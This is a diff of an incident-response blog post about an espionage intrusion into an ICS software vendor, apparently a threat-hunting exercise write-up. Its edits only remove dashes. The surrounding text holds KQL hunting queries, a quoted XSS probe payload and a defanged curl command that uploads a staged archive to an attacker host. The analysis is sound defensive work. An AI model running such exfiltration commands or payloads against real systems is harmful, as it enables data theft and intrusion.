@@ -34,9 +34,9 @@ math: false
 
 ## Executive Summary
 
-Between May 1 and May 28, 2024, a targeted, multi-stage cyber-espionage campaign successfully compromised **Solvi Systems**. Because Solvi Systems develops the proprietary **DOCKS Industrial Control Systems (ICS)** software which manages energy distribution networks across South Africa, Mozambique, Eswatini, Zimbabwe, and Namibia — this intrusion represented a severe regional critical-infrastructure supply-chain risk and a latent public-safety threat.
+Between May 1 and May 28, 2024, a targeted, multi-stage cyber-espionage campaign successfully compromised **Solvi Systems**. Because Solvi Systems develops the proprietary **DOCKS Industrial Control Systems (ICS)** software which manages energy distribution networks across South Africa, Mozambique, Eswatini, Zimbabwe, and Namibia this intrusion represented a severe regional critical-infrastructure supply-chain risk and a latent public-safety threat.
 
-The adversary used initial web reconnaissance and defensive-evasion techniques to deliver targeted spear-phishing lures. After gaining initial access to a corporate operations endpoint, the actor established persistent Command-and-Control (C2) beaconing via custom malware (`ecobug.exe`), executed localized privilege escalation, and moved laterally into a customer-facing engineering role (Docks Customer Success). The operation culminated in the targeted collection, compression, and exfiltration of sensitive Software Development Lifecycle (SDLC) blueprints and product documentation — exposing downstream utility substations to potential future kinetic disruption.
+The adversary used initial web reconnaissance and defensive-evasion techniques to deliver targeted spear-phishing lures. After gaining initial access to a corporate operations endpoint, the actor established persistent Command-and-Control (C2) beaconing via custom malware (`ecobug.exe`), executed localized privilege escalation, and moved laterally into a customer-facing engineering role (Docks Customer Success). The operation culminated in the targeted collection, compression, and exfiltration of sensitive Software Development Lifecycle (SDLC) blueprints and product documentation exposing downstream utility substations to potential future kinetic disruption.
 
 ## 1. Incident Timeline
 
@@ -71,7 +71,7 @@ Email
 | count
 ```
 
-{% include figure.html src="/assets/images/posts/operation-dockshock/s-2.png" alt="KQL Email query result showing a count of 31 inbound emails to the CTO" caption="Figure 2: Inbound email count to the CTO — 31 messages identified." %}
+{% include figure.html src="/assets/images/posts/operation-dockshock/s-2.png" alt="KQL Email query result showing a count of 31 inbound emails to the CTO" caption="Figure 2: Inbound email count to the CTO, 31 messages identified." %}
 
 **Result:** 31 inbound emails identified. Baseline network profiling also revealed that the threat actor was aggressively monitoring the domain, hunting for organizational context surrounding the docks-ics product string.
 
@@ -86,7 +86,7 @@ InboundNetworkEvents
 | project timestamp, src_ip, user_agent, url, status_code
 ```
 
-{% include figure.html src="/assets/images/posts/operation-dockshock/s-3.png" alt="Web log inbound event from 13[.]201[.]46[.]208 with a 404 error code and Opera/8.64 user-agent string" caption="Figure 3: Perimeter probe from 13[.]201[.]46[.]208 — 404 responses and an anomalous Opera/8.64 user agent." %}
+{% include figure.html src="/assets/images/posts/operation-dockshock/s-3.png" alt="Web log inbound event from 13[.]201[.]46[.]208 with a 404 error code and Opera/8.64 user-agent string" caption="Figure 3: Perimeter probe from 13[.]201[.]46[.]208, 404 responses and an anomalous Opera/8.64 user agent." %}
 
 *   **Attacker Payload:** `</script><script>alert('xss')</script>`
 *   **WAF Mitigation Status:** Deflected. The web server responded with a 404 Status Code, preventing script execution.
@@ -173,7 +173,7 @@ ProcessEvents
 
 The collected assets were compressed locally into `C:\Users\alpetrov\CollectedData\CollectedData.zip`. To prepare for exfiltration, the actor relocated this staging archive out of the user directory into a localized root path, renaming it to `C:\DataExfil\CollectedData.zip` to streamline programmatic access. Concurrently, the attacker compromised three distinct internal accounts to browse the developer intranet (devportal[.]solvisystems[.]com) and read the internal_process.pdf deployment documentation. The adversary even used compromised mailboxes to distribute phishing messages internally under urgent security headings (Urgent Request: DOCKS System Documentation) to gather structural details.
 
-On May 28, 2024, the adversary leveraged `curl.exe` — a native utility that ships by default with modern Windows — as a **Living-off-the-Land Binary (LotLBin)** to bypass standard file-transfer protocol tracking, exfiltrating the source blueprint archive directly over an HTTP POST stream:
+On May 28, 2024, the adversary leveraged `curl.exe` a native utility that ships by default with modern Windows as a **Living-off-the-Land Binary (LotLBin)** to bypass standard file-transfer protocol tracking, exfiltrating the source blueprint archive directly over an HTTP POST stream:
 
 ```kql
 // Query 7: Catching the final data exfiltration process command
@@ -181,7 +181,7 @@ ProcessEvents
 | where process_commandline contains "curl" and process_commandline contains "upload"
 ```
 
-{% include figure.html src="/assets/images/posts/operation-dockshock/s-7.png" alt="Curl command performing a file POST to api[.]eco-awareness-update[.]net" caption="Figure 7: curl exfiltration — file POST to the adversary API node api[.]eco-awareness-update[.]net." %}
+{% include figure.html src="/assets/images/posts/operation-dockshock/s-7.png" alt="Curl command performing a file POST to api[.]eco-awareness-update[.]net" caption="Figure 7: curl exfiltration file POST to the adversary API node api[.]eco-awareness-update[.]net." %}
 
 *   **Exfiltration Command Line:** curl -F 'file=@C:\DataExfil\CollectedData.zip' hxxps://api[.]eco-awareness-update[.]net/upload
 
@@ -198,7 +198,7 @@ ProcessEvents
 | Collection | T1074.001 | Data Staging: Local Data Staging | Consolidation of SDLC files into C:\DataExfil\CollectedData.zip. |
 | Exfiltration | T1567 | Exfiltration Over Web Service | Exfiltration of core source blueprints via a native LotLBin (curl.exe) web POST. |
 
-<!-- Section: Proactive Detection Engineering (Sigma & KQL rules) — to be added later, once the detections can be operationally justified. -->
+<!-- Section: Proactive Detection Engineering (Sigma & KQL rules) to be added later, once the detections can be operationally justified. -->
 
 ## 4. Consolidated Indicators of Compromise (IOCs)
 
